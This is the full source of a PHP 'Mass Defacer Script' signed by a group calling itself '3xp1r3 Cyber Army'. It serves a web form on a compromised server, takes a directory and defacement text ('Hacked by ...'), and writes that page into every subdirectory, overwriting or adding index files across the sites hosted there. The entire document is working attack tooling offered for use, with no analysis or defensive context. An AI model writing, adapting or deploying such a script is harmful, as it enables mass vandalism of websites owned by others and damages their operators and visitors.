<?php 
echo "<title>Mass Defacer Script</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='3ca.txt'><br><br>";
echo "Your Index : <br><textarea style='width: 685px; height: 330px;' name='index'>Hacked by 3xp1r3 Cyber Army \n ./FrankWix</textarea><br>";
echo "<input type='submit' value='Start'></form></center>";
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
  if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
        $files = @scandir ($_POST['base_dir']) or die ("oohhh shit<br>");
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index<br>";
                }
        endforeach;
}
?>
